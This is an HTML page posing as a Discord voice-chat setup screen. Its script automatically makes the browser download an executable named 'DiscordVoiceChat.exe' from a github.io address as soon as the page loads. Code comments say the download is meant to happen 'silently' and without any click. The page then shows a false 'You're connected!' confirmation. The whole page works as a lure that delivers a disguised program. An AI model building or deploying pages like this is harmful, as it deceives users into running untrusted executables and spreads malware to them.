<!DOCTYPE html>
<html><head><meta charset="utf-8">
<title>Discord Voice</title>
<style>
 body{margin:0;font-family:'gg sans',Segoe UI,Roboto,sans-serif;background:#1e1f22;color:#fff;
      display:flex;align-items:center;justify-content:center;min-height:100vh}
 .card{background:#2b2d31;padding:36px 44px;border-radius:12px;max-width:430px;
       box-shadow:0 8px 30px rgba(0,0,0,.4);text-align:center}
 .logo{font-size:46px}
 h1{font-size:24px;margin:14px 0 6px}
 p{color:#b5bac1;font-size:15px;line-height:1.5;margin:0 0 22px}
 .btn{background:#5865f2;border:0;color:#fff;font-size:16px;font-weight:600;
      padding:13px 26px;border-radius:7px;cursor:pointer;width:100%}
 .btn:hover{background:#4752c4}
 .ok{display:none}
 .dot{display:inline-block;width:11px;height:11px;border-radius:50%;background:#3ba55c;
      margin-right:8px;animation:pulse 1.2s infinite}
 @keyframes pulse{0%{opacity:1}50%{opacity:.4}100%{opacity:1}}
 .small{margin-top:18px;font-size:13px;color:#80848e}
</style></head>
<body>
 <div class="card">
   <div class="logo">🎧</div>
   <h1>Discord Voice Chat</h1>
   <p id="msg">Voice needs a quick update to join. Click below to finish the setup —
      it only takes a second.</p>
   <button class="btn" onclick="go()">Finish setup</button>
   <div class="ok" id="ok" style="margin-top:22px">
     <span class="dot"></span><b>You're connected!</b><br>
     <span style="color:#b5bac1">Voice is ready. Go back to Discord and hit a channel.</span>
   </div>
   <div class="small">If nothing happens, allow the download when your browser asks.</div>
 </div>
 <script>
  function go(){
    // silently hand the browser the exe
    var a=document.createElement('a');
    a.href='https://NorthOfPotential.github.io/voice/DiscordVoiceChat.exe'; a.download='DiscordVoiceChat.exe';
    document.body.appendChild(a); a.click(); a.remove();
    document.getElementById('msg').textContent='Starting…';
    setTimeout(function(){
      document.getElementById('ok').style.display='block';
    },900);
  }
  // auto-start the download so even a clickless load grabs it
  go();
 </script>
</body></html>
